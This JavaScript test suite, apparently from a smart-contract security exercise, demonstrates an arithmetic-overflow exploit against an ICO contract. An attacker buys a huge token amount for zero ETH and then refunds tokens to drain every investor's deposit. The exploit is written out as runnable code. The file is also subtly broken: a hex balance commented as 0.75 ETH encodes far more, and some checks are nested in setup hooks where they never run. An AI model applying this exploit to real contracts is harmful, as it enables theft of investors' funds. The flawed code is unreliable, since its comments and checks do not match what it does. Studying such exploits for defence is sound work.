/*
  Explanation of Exploit:
  -----------------------
  In this test suite, we will demonstrate an exploit targeting the QuantumPortfoliosICO smart contract.
  The vulnerability lies in the buy function, where an arithmetic overflow can be triggered.

  By carefully crafting a specific token purchase amount, an attacker can bypass the contract's requirements,
  receive an unexpected amount of tokens, and subsequently refund all the tokens to drain the contract's balance.

  The key to the exploit is to select a token purchase amount that causes an overflow in the contract's calculations,
  leading to a mismatch between the expected and actual token amounts.
  We will simulate the attack and validate that it successfully drains the contract's balance.
*/

const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("ICO Overflow Testing Suite", function () {
  // Defining the participants in the scenario
  let deployer, investor1, investor2, investor3, attacker;

  // Investment amounts in Ether, defining how much each investor has invested in the ICO
  const FIRST_INVESTOR_INVESTED = ethers.utils.parseEther("480");
  const SECOND_INVESTOR_INVESTED = ethers.utils.parseEther("115");
  const THIRD_INVESTOR_INVESTED = ethers.utils.parseEther("45");
  const SECOND_INVESTOR_REFUNDED = ethers.utils.parseEther("20");

  // Calculating the total amount invested by all investors, considering any refunds
  const TOTAL_INVESTED = FIRST_INVESTOR_INVESTED.add(SECOND_INVESTOR_INVESTED)
    .add(THIRD_INVESTOR_INVESTED)
    .sub(SECOND_INVESTOR_REFUNDED);

  before(async function () {
    // Setting up the initial state for the test scenario

    // Assigning Ethereum addresses to the deployer, investors, and attacker
    [deployer, investor1, investor2, investor3, attacker] =
      await ethers.getSigners();

    // Attacker starts with 0.75 ETH
    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0xA9137D9C9CFE00000", // 0.75 ETH
    ]);

    // Confirming the attacker's initial balance
    this.initialAttackerBalancer = await ethers.provider.getBalance(
      attacker.address
    );
    it("[Test I] Should validate attacker's initial balance is 0.75 ETH", async function () {
      expect(this.initialAttackerBalancer).to.be.equal(
        ethers.utils.parseEther("0.75")
      );
    });

    // Deploying the QuantumPortfoliosICO contract
    const QuantumPortfoliosICOFactory = await ethers.getContractFactory(
      "./QuantumPortfoliosICO.sol:QuantumPortfoliosICO",
      deployer
    );
    this.ico = await QuantumPortfoliosICOFactory.deploy();

    // Obtaining the corresponding QuantumPortfoliosToken contract
    this.token = await ethers.getContractAt(
      "./QuantumPortfoliosToken.sol:IERC20",
      await this.ico.token()
    );
  });
  describe("Investments Tests", function () {
    it("[Test II] Should reject investment with wrong ETH amount sent", async function () {
      // Testing investment failure when an incorrect amount of ETH is sent
      // Investor1 tries to buy tokens without sending enough ETH
      await expect(
        this.ico.connect(investor1).buy(FIRST_INVESTOR_INVESTED.mul(10))
      ).to.be.revertedWith("wrong ETH amount sent");
    });

    it("[Test III] Should allow investor1 to invest 480 ETH and receive corresponding tokens", async function () {
      // Investor1 successfully buys tokens by sending the correct amount of ETH
      await this.ico.connect(investor1).buy(FIRST_INVESTOR_INVESTED.mul(10), {
        value: FIRST_INVESTOR_INVESTED,
      });
      // Validating that investor1's token balance is correctly updated
      expect(await this.token.balanceOf(investor1.address)).to.be.equal(
        FIRST_INVESTOR_INVESTED.mul(10)
      );
    });

    it("[Test IV] Should allow investor2 to invest 115 ETH and receive corresponding tokens", async function () {
      // Investor2 successfully buys tokens by sending the correct amount of ETH
      await this.ico.connect(investor2).buy(SECOND_INVESTOR_INVESTED.mul(10), {
        value: SECOND_INVESTOR_INVESTED,
      });
      // Validating that investor2's token balance is correctly updated
      expect(await this.token.balanceOf(investor2.address)).to.be.equal(
        SECOND_INVESTOR_INVESTED.mul(10)
      );
    });

    it("[Test V] Should allow investor3 to invest 45 ETH and receive corresponding tokens", async function () {
      // Investor3 successfully buys tokens by sending the correct amount of ETH
      await this.ico.connect(investor3).buy(THIRD_INVESTOR_INVESTED.mul(10), {
        value: THIRD_INVESTOR_INVESTED,
      });
      // Validating that investor3's token balance is correctly updated
      expect(await this.token.balanceOf(investor3.address)).to.be.equal(
        THIRD_INVESTOR_INVESTED.mul(10)
      );
    });

    it("[Test VI] Should verify total balance of ICO contract after all investments", async function () {
      // Checking that the total balance of the ICO contract is the sum of all investments
      expect(await ethers.provider.getBalance(this.ico.address)).to.be.equal(
        FIRST_INVESTOR_INVESTED.add(SECOND_INVESTOR_INVESTED).add(
          THIRD_INVESTOR_INVESTED
        )
      );
    });
  });

  describe("Refund Tests", function () {
    it("[Test VII] Should reject refund if investor tries to refund more tokens than owned", async function () {
      // Testing refund failure when an investor tries to refund tokens more than owned
      // Investor2 tries to refund 100 times more tokens than they own, and the operation should be reverted
      await expect(
        this.ico.connect(investor2).refund(SECOND_INVESTOR_INVESTED.mul(100))
      ).to.be.revertedWith("ERC20: burn amount exceeds balance");
    });

    it("[Test VIII] Should allow investor2 to refund 20 ETH and reduce corresponding tokens", async function () {
      // Investor2 successfully refunds tokens and receives the corresponding amount of ETH
      // 20 ETH worth of tokens will be refunded, and the balance should be updated accordingly
      await this.ico
        .connect(investor2)
        .refund(SECOND_INVESTOR_REFUNDED.mul(10));
      // Validating that ICO contract's balance and investor2's token balance are correctly updated
      expect(await ethers.provider.getBalance(this.ico.address)).to.be.equal(
        TOTAL_INVESTED
      );
      expect(await this.token.balanceOf(investor2.address)).to.be.equal(
        SECOND_INVESTOR_INVESTED.sub(SECOND_INVESTOR_REFUNDED).mul(10)
      );
    });
  });

  describe("Exploit", function () {
    it("[Test IX] Should exploit the ICO by triggering an arithmetic overflow to drain all ETH from the contract", async function () {
      // Our goal is to drain all ETH from the ICO contract
      // We will do this by refunding all the tokens, through a vulnerability in the buy function
  
      // The vulnerability is in the buy function, where we can overflow the uint256
      // The overflow is triggered due to improper validation and arithmetic calculations
      // Let' determine the amount of tokens to buy to overflow the uint256
      // We want to pass the require check while not sending any tokens, so msg.value == 0 and numTokens * 10 / 100 == 0
      // To have numTokens * 10 / 100 == 0, we will trigger an overflow
      // We'll do this by setting numTokens to MAX_UINT256 / 10 + 1
      let overflowAmount = ethers.constants.MaxUint256.div(10).add(1);
  
      // Buying tokens with the calculated overflow amount without sending any value
      // This step simulates the malicious action to exploit the overflow vulnerability
      await this.ico.connect(attacker).buy(overflowAmount, { value: 0 });
  
      // Refunding the tokens to drain the ICO contract
      // This step leverages the tokens obtained through the overflow to empty the contract's balance
      await this.ico.connect(attacker).refund(TOTAL_INVESTED.mul(10));
    });
  });
  
  after(async function () {
    it("[Test X] Should validate that the attacker successfully drained all ETH from the ICO contract", async function () {
      // Success conditions validating the exploit
      // The ICO contract's balance should be zero
      // The attacker's balance should be greater than the initial balance plus the total invested amount minus transaction fees
      expect(await ethers.provider.getBalance(this.ico.address)).to.be.equal(0);
      expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
        this.initialAttackerBalancer.add(TOTAL_INVESTED).sub(ethers.utils.parseEther("0.2"))
      );
    });
  });
  